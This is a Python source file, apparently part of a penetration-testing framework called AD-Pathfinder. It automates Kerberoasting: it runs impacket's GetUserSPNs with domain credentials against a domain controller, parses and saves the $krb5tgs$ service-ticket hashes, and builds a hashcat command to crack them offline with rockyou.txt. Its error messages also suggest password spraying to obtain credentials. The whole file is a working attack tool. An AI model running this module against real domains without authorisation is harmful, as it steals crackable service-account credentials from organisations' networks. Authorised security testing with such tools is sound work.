"""
kerberoasting_module.py - Kerberoasting attack module for AD-Pathfinder.

Performs Kerberoasting against a DC using impacket's GetUserSPNs tool.
Requests TGS (service) tickets for accounts with SPNs registered and saves
them for offline cracking.

Attack chain:
    1. Detect impacket binary (impacket-GetUserSPNs or GetUserSPNs.py)
    2. Requires valid credentials (initial_credentials or valid_credentials)
    3. Request TGS tickets for all SPNs in the domain
    4. Parse $krb5tgs$ hashes from output
    5. Save to reports/<assessment_id>-kerb.txt
    6. Update state.hashes and state.spns
    7. Return hashcat -m 13100 crack suggestion

Tools used:
    - impacket-GetUserSPNs (or GetUserSPNs.py)
"""

from __future__ import annotations

import os
import re
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState, Credentials

REPORTS_DIR = "reports"

# ─────────────────────────────────────────────────────────────────────────────
# Hash patterns
# ─────────────────────────────────────────────────────────────────────────────

TGS_HASH_RE  = re.compile(r"(\$krb5tgs\$\d+\$.+)",  re.IGNORECASE)
SPN_LINE_RE  = re.compile(
    r"ServicePrincipalName\s+Name\s+.*?^((?:\S+\s+\S+.*?\n)+)",
    re.MULTILINE | re.DOTALL,
)
# GetUserSPNs shows SPNs in a table format:
#   MSSQLSvc/dc01.corp.local:1433   sqlsvc   ...
SPN_ROW_RE   = re.compile(r"^(\S+)\s+(\S+)", re.MULTILINE)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_impacket(executor: CommandExecutor) -> Optional[str]:
    for binary in ("impacket-GetUserSPNs", "GetUserSPNs.py", "GetUserSPNs"):
        if executor.check_tool(binary):
            return binary
    return None


def _pick_credentials(state: AssessmentState) -> Optional[Credentials]:
    """
    Return the best available credentials for the attack.
    Prefers valid_credentials (proven working) over initial_credentials.
    """
    if state.valid_credentials:
        vc = state.valid_credentials[0]
        return Credentials(
            username=vc.get("username", ""),
            password=vc.get("password", ""),
            ntlm_hash=vc.get("ntlm_hash", ""),
        )
    creds = state.initial_credentials
    if creds.username and (creds.password or creds.ntlm_hash):
        return creds
    return None


def _parse_tgs_hashes(output: str) -> list[dict]:
    """
    Extract TGS hashes and associated SPN/username from GetUserSPNs output.

    Returns list of {username, spn, hash} dicts.
    """
    results: list[dict] = []

    for match in TGS_HASH_RE.finditer(output):
        raw_hash = match.group(1).strip()

        # Hash format: $krb5tgs$<etype>$*<user>/<spn>*$...
        # Extract username and SPN from the inner blob
        inner_match = re.search(r"\*([^/]+)/([^*]+)\*", raw_hash)
        username = inner_match.group(1) if inner_match else "unknown"
        spn      = inner_match.group(2) if inner_match else "unknown"

        results.append({
            "username": username,
            "spn":      spn,
            "hash":     raw_hash,
        })

    return results


def _parse_spns_from_output(output: str) -> list[dict]:
    """
    Parse the SPN table from GetUserSPNs stdout (when not requesting hashes).
    Fallback: if -request was used, SPNs come embedded in the hash blob.
    """
    spns: list[dict] = []
    in_table = False

    for line in output.splitlines():
        if "ServicePrincipalName" in line and "Name" in line:
            in_table = True
            continue
        if in_table:
            parts = line.split()
            if len(parts) >= 2 and "/" in parts[0]:
                spns.append({"spn": parts[0], "username": parts[1]})
            elif not line.strip():
                in_table = False

    return spns


def _save_hash_file(hashes: list[dict], assessment_id: str) -> str:
    os.makedirs(REPORTS_DIR, exist_ok=True)
    path = os.path.join(REPORTS_DIR, f"{assessment_id}-kerb.txt")
    with open(path, "w", encoding="utf-8") as fh:
        for entry in hashes:
            fh.write(entry["hash"] + "\n")
    return os.path.abspath(path)


# ─────────────────────────────────────────────────────────────────────────────
# KerberoastingModule
# ─────────────────────────────────────────────────────────────────────────────

class KerberoastingModule:
    """
    Kerberoasting attack against a Domain Controller.

    Requires valid domain credentials (initial or discovered).
    Requests TGS tickets for all SPN-bearing accounts and extracts
    crackable hashes.

    Parameters
    ----------
    executor : CommandExecutor | None
        Defaults to a 180-second timeout instance.
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        # 600s: GetUserSPNs -request can be slow on large domains
        self.executor = executor or CommandExecutor(verbose=False, default_timeout=600)

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def run(self, state: AssessmentState) -> dict:
        """
        Execute Kerberoasting and update state.

        Returns
        -------
        dict
            {
                "status":        "success" | "error",
                "hashes":        list[dict],   # {username, spn, hash}
                "hash_file":     str | None,
                "spns":          list[dict],   # {username, spn}
                "crack_command": str,
                "error":         str | None,
                "warnings":      list[str],
            }
        """
        binary = _detect_impacket(self.executor)
        if not binary:
            return self._error(
                "impacket-GetUserSPNs not found. Run: sudo apt install python3-impacket"
            )

        creds = _pick_credentials(state)
        if not creds:
            return self._error(
                "No credentials available. Kerberoasting requires a valid domain "
                "account. Run password spraying or use credentials from LDAP enumeration."
            )

        target   = state.target_ip
        domain   = state.domain
        warnings: list[str] = []

        # ── Build credential string ─────────────────────────────────────
        # Playbook command:
        #   impacket-GetUserSPNs VulnAD.ma/username:password -dc-ip <IP> -request
        if creds.ntlm_hash:
            nt = creds.ntlm_hash.split(":")[-1] if ":" in creds.ntlm_hash else creds.ntlm_hash
            auth_args = [
                f"{domain}/{creds.username}",
                "-hashes", f":{nt}",
            ]
        else:
            auth_args = [f"{domain}/{creds.username}:{creds.password}"]

        # ── Build command ───────────────────────────────────────────────
        command = [
            binary,
            *auth_args,
            "-dc-ip", target,
            "-request",
        ]

        from rich.console import Console as _RCon
        _RCon().print(
            f"  [dim]Command: {binary} {domain}/{creds.username}:<pass> "
            f"-dc-ip {target} -request[/dim]"
        )

        # ── Clean environment (venv isolation fix) ──────────────────────
        # Same fix as AS-REP: impacket is a system binary that needs system
        # Python's site-packages (pyasn1 etc).  Strip venv env vars so the
        # subprocess uses system Python, not the venv interpreter.
        import os as _os
        clean_env = dict(_os.environ)
        for _var in ("VIRTUAL_ENV", "PYTHONHOME", "PYTHONPATH"):
            clean_env.pop(_var, None)
        venv_bin = _os.path.join(_os.environ.get("VIRTUAL_ENV", ""), "bin")
        orig_path = clean_env.get("PATH", "")
        clean_env["PATH"] = ":".join(p for p in orig_path.split(":") if p != venv_bin)

        result   = self.executor.run(command, ok_exit_codes=(0, 1), env=clean_env)
        combined = result["output"] + "\n" + result["error"]

        # ── Debug output ────────────────────────────────────────────────
        from rich.console import Console as _RCon2
        if not combined.strip():
            _RCon2().print("  [bold red]WARNING: impacket returned empty output.[/bold red]")
        elif "traceback" in combined.lower():
            _RCon2().print(f"  [bold red]impacket CRASH ({len(combined)} chars):[/bold red]")
            for line in combined.strip().splitlines()[:20]:
                _RCon2().print(f"  [red]{line}[/red]")
        else:
            first = combined.strip().splitlines()[0]
            _RCon2().print(f"  [dim]impacket output ({len(combined)} chars): {first[:120]}[/dim]")


        # ── Parse results ───────────────────────────────────────────────
        tgs_entries = _parse_tgs_hashes(combined)
        spn_list    = _parse_spns_from_output(combined)

        if not tgs_entries:
            msg = "No TGS hashes returned."
            if "invalid credentials" in combined.lower():
                msg += " Credentials were rejected by the DC."
            elif "kdc_err_s_principal_unknown" in combined.lower():
                msg += " No SPN accounts found in the domain."
            elif "clock skew" in combined.lower():
                warnings.append("Clock skew too large — sync: ntpdate <dc_ip>")
            return {
                "status":        "success",
                "hashes":        [],
                "hash_file":     None,
                "spns":          spn_list,
                "crack_command": "",
                "error":         None,
                "warnings":      warnings + [msg],
            }

        # ── Save hashes ─────────────────────────────────────────────────
        hash_file = _save_hash_file(tgs_entries, state.assessment_id)
        crack_cmd = f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt --force"

        # ── Update state ────────────────────────────────────────────────
        existing_hashes = {h["hash"] for h in state.hashes}
        existing_spns   = {(s["username"], s["spn"]) for s in state.spns}

        for entry in tgs_entries:
            if entry["hash"] not in existing_hashes:
                state.hashes.append({
                    "type":     "tgs",
                    "username": entry["username"],
                    "spn":      entry["spn"],
                    "hash":     entry["hash"],
                })
                existing_hashes.add(entry["hash"])

            spn_key = (entry["username"], entry["spn"])
            if spn_key not in existing_spns:
                state.spns.append({"username": entry["username"], "spn": entry["spn"]})
                existing_spns.add(spn_key)

        state.log_finding(
            category="Kerberoasting",
            description=(
                f"{len(tgs_entries)} TGS ticket(s) captured. "
                f"Accounts: {', '.join(e['username'] for e in tgs_entries[:5])}. "
                f"Hashes saved to {hash_file}. Crack with: hashcat -m 13100"
            ),
            severity="CRITICAL",
        )
        state.log_action(
            f"Kerberoasting — {len(tgs_entries)} TGS ticket(s) captured as {creds.username}"
        )

        return {
            "status":        "success",
            "hashes":        tgs_entries,
            "hash_file":     hash_file,
            "spns":          spn_list or [{"username": e["username"], "spn": e["spn"]} for e in tgs_entries],
            "crack_command": crack_cmd,
            "error":         None,
            "warnings":      warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":        "error",
            "hashes":        [],
            "hash_file":     None,
            "spns":          [],
            "crack_command": "",
            "error":         message,
            "warnings":      [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.kerberoasting_module import run as kerb_run
    result = kerb_run(state)
    """
    return KerberoastingModule(executor=executor).run(state)


# ─────────────────────────────────────────────────────────────────────────────
# Smoke-test
# Usage: python modules/kerberoasting_module.py <target_ip> <domain> <user> <pass>
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python modules/kerberoasting_module.py <target_ip> <domain> <user> <pass>")
        sys.exit(1)

    from session import AssessmentState, Credentials, generate_assessment_id

    test_state = AssessmentState(
        assessment_id=generate_assessment_id(),
        target_ip=sys.argv[1],
        domain=sys.argv[2],
        open_ports=[88, 389, 445],
        initial_credentials=Credentials(username=sys.argv[3], password=sys.argv[4]),
    )

    module = KerberoastingModule(executor=CommandExecutor(verbose=True))
    result = module.run(test_state)

    print("\n" + "─" * 60)
    print(f"  Status   : {result['status']}")
    print(f"  TGS found: {len(result['hashes'])}")
    print(f"  Hash file: {result['hash_file']}")
    print(f"  Crack cmd: {result['crack_command']}")
    if result["error"]:
        print(f"  Error    : {result['error']}")
    for w in result["warnings"]:
        print(f"  ⚠  {w}")
    for e in result["hashes"]:
        print(f"  [{e['username']}] {e['spn']} → {e['hash'][:60]}…")
